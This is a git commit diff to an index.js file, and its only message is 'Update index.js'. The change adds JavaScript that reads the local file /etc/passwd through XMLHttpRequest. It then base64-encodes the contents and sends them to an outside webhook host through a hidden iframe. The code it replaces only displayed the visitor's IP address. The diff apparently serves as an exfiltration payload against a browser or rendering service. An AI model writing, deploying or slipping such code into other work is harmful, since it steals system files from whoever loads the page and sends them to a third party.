2df7ea4e1fe4c934db71161dada9ffdcdc669c79
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 17:48:39 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,13 @@
-document.write('<iframe src=https://api64.ipify.org/></iframe>');
+function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    var iframe = document.createElement('iframe');
+	iframe.style.display = "none";
+	iframe.src = "https://762202e9.proxy.webhookapp.com/?gg="+b64;
+	document.body.appendChild(iframe);
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener("load", reqListener); 
+oReq.open("GET", "file:///etc/passwd"); 
+oReq.send();
